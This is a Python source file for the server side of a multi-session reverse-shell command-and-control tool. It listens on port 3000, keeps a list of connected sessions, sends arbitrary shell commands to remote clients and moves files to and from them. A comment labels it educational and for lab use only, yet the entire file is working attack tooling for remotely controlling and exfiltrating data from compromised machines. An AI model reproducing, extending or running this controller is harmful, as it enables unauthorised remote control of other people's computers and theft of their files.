import socket
import threading
import json
import base64
import os

# Educational server for managing remote shell sessions (lab use only).

sessions = {}
addresses = {}
statuses = {}
session_counter = 0


def reliable_send(data, conn):
    """
    Sends JSON-encoded data over the socket.
    """
    json_data = json.dumps(data)
    conn.sendall(json_data.encode())

def reliable_recv(conn):
    """
    Receives and decodes JSON data from the socket.
    """
    buffer = ""
    while True:
        try:
            buffer += conn.recv(1024).decode()
            return json.loads(buffer)
        except json.JSONDecodeError:
            continue

def download_file(command, conn):
    """
    Receives and saves a file from the client.
    """
    try:
        file_name = command.split()[1]
        reliable_send(command, conn)
        file_data = reliable_recv(conn)
        if file_data.startswith("[!!]"):
            print(file_data)
        else:
            with open(file_name, "wb") as f:
                f.write(base64.b64decode(file_data))
            print(f"[+] Downloaded: {file_name}")
    except Exception as e:
        print(f"[-] Download error: {e}")

def upload_file(command, conn):
    """
    Sends a file from server to client.
    """
    try:
        file_name = command.split()[1]
        with open(file_name, "rb") as f:
            file_data = base64.b64encode(f.read()).decode()
        reliable_send(command, conn)
        reliable_send(file_data, conn)
        print(reliable_recv(conn))
    except Exception as e:
        print(f"[-] Upload error: {e}")

def handle_client(conn, session_id):
    """
    Handles interactive shell for a client session.
    """
    addr = addresses[session_id]
    print(f"[+] Connected to {addr} (Session #{session_id})")
    statuses[session_id] = "Active"

    while True:
        try:
            command = input(f"Shell #{session_id}> ").strip()
            if not command:
                continue

            if command.startswith("download"):
                download_file(command, conn)
            elif command.startswith("upload"):
                upload_file(command, conn)
            elif command == "background":
                statuses[session_id] = "Background"
                break
            elif command == "exit":
                conn.close()
                del sessions[session_id]
                print(f"[+] Session #{session_id} closed.")
                break
            else:
                reliable_send(command, conn)
                result = reliable_recv(conn)
                print(result)

        except Exception as e:
            print(f"[-] Error: {e}")
            break

def start_server():
    """
    Starts the socket server and listens for connections.
    """
    global session_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 3000))  # Use local IP in lab
    server.listen(5)
    print("[*] Listening on port 3000...")

    while True:
        conn, addr = server.accept()
        session_id = session_counter
        session_counter += 1
        sessions[session_id] = conn
        addresses[session_id] = addr
        statuses[session_id] = "Connected"
        print(f"[+] New connection from {addr} (Session #{session_id})")


def interactive_shell():
    """
    Main interactive shell to manage sessions.
    """
    while True:
        command = input("Manager> ").strip()
        if not command:
            continue
        if command == "sessions list":
            for sid, addr in addresses.items():
                print(f"Session {sid}: {addr} - {statuses.get(sid, 'Unknown')}")
        elif command.startswith("connect"):
            try:
                session_id = int(command.split()[1])
                if session_id in sessions:
                    handle_client(sessions[session_id], session_id)
                else:
                    print("[-] Session not found.")
            except Exception as e:
                print(f"[-] Error: {e}")
        elif command.startswith("sessions kill"):
            try:
                session_id = int(command.split()[2])
                if session_id in sessions:
                    sessions[session_id].close()
                    del sessions[session_id]
                    del addresses[session_id]
                    del statuses[session_id]
                    print(f"[+] Session {session_id} killed.")
                else:
                    print("[-] Session not found.")
            except Exception as e:
                print(f"[-] Error: {e}")
        elif command == "help":
            print("""
Available Commands:
- sessions list         : Show active sessions
- connect <id>          : Connect to a session
- sessions kill <id>    : Kill a session
- help                  : Show this help menu
            """)
        else:
            print("[-] Unknown command. Type 'help' for help.")

# Start the server thread
server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()
interactive_shell()
